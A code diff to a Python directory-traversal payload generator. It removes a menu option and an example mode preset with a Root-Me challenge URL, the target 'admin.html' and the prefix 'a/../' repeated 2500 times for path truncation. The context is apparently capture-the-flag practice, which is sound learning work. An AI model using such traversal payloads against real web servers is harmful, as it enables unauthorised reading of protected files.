@@ -242,16 +242,13 @@ class DirectoryTraversalGenerator:
             print("Select mode:")
             print("1. Interactive mode (single payload)")
             print("2. Batch mode (multiple payloads)")
-            print("3. Example (pre-configured)")
             
-            choice = input("Choice (1-3): ").strip()
+            choice = input("Choice (1-2): ").strip()
             
             if choice == "1":
                 self.interactive_mode()
             elif choice == "2":
                 self.batch_mode()
-            elif choice == "3":
-                self._example_mode()
             else:
                 print("Invalid choice")
                 sys.exit(1)
@@ -262,29 +259,6 @@ class DirectoryTraversalGenerator:
         except Exception as e:
             print(f"Error: {e}")
             sys.exit(1)
-    
-    def _example_mode(self) -> None:
-        """Example mode with pre-configured values"""
-        print("\n" + "=" * 60)
-        print("EXAMPLE MODE")
-        print("=" * 60)
-        
-        # Pre-configured example
-        base_url = "http://challenge01.root-me.org/web-serveur/ch35/index.php?page="
-        target_file = "admin.html"
-        path_prefix = "a/../"
-        repeat_count = 2500
-        
-        result = self.generate_payload(base_url, target_file, path_prefix, repeat_count)
-        
-        print("Pre-configured example:")
-        print(f"URL: {base_url}")
-        print(f"Target: {target_file}")
-        print(f"Path: {path_prefix}")
-        print(f"Repetitions: {repeat_count}")
-        
-        self._display_result(result)
-
 
 def main():
     """Main function"""
